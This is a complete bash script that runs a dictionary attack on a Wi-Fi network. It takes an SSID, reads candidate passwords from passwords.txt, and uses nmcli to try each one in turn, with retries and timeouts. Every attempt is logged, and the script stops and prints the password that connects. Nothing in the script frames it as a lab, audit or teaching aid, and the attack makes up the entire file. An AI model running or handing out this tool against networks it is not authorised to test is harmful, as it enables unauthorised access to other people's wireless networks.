#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: $0 <SSID>"
    exit 1
fi

SSID="$1"
PASSWORD_FILE="passwords.txt"
LOG_FILE="wifi_attempts.log"
TIMEOUT=3
RETRIES=2
SLEEP=0.3
CON_NAME="temp_$(date +%s)"

# Validate password file
if [ ! -f "$PASSWORD_FILE" ] || [ ! -s "$PASSWORD_FILE" ]; then
    echo "Error: $PASSWORD_FILE not found or empty" | tee "$LOG_FILE"
    exit 1
fi

# Check if WiFi device is available
WIFI_DEV=$(nmcli device status | grep wifi | awk '{print $1}' | head -1)
if [ -z "$WIFI_DEV" ]; then
    echo "Error: No WiFi device found" | tee "$LOG_FILE"
    exit 1
fi

# Clean up existing temp connections
nmcli connection show | grep temp | awk '{print $1}' | while read -r conn; do
    nmcli connection delete "$conn" &> /dev/null
done

echo "Starting WiFi password attempts for SSID: $SSID on $WIFI_DEV" | tee "$LOG_FILE"
TOTAL_PASSWORDS=$(wc -l < "$PASSWORD_FILE")
COUNT=0

# Create temporary connection
nmcli connection add type wifi con-name "$CON_NAME" ssid "$SSID" ifname "$WIFI_DEV" save no
if [ $? -ne 0 ]; then
    echo "Error: Failed to create temporary connection" | tee -a "$LOG_FILE"
    exit 1
fi

while IFS= read -r password; do
    COUNT=$((COUNT + 1))
    echo "[$COUNT/$TOTAL_PASSWORDS] Trying SSID: $SSID, Password: $password" | tee -a "$LOG_FILE"
    nmcli connection modify "$CON_NAME" wifi-sec.key-mgmt wpa-psk wifi-sec.psk "$password"
    for ((i=1; i<=RETRIES; i++)); do
        timeout "$TIMEOUT" nmcli connection up "$CON_NAME" &> /dev/null
        if [ $? -eq 0 ]; then
            echo "Success! Connected with password: $password Attempt $i" | tee -a "$LOG_FILE"
            nmcli connection show >> "$LOG_FILE"
            nmcli connection delete "$CON_NAME" &> /dev/null
            exit 0
        fi
        echo "Failed with password: $password Attempt $i" | tee -a "$LOG_FILE"
        sleep "$SLEEP"
    done
done < "$PASSWORD_FILE"

# Clean up
nmcli connection delete "$CON_NAME" &> /dev/null
echo "No valid password found after $COUNT attempts." | tee -a "$LOG_FILE"
exit 1
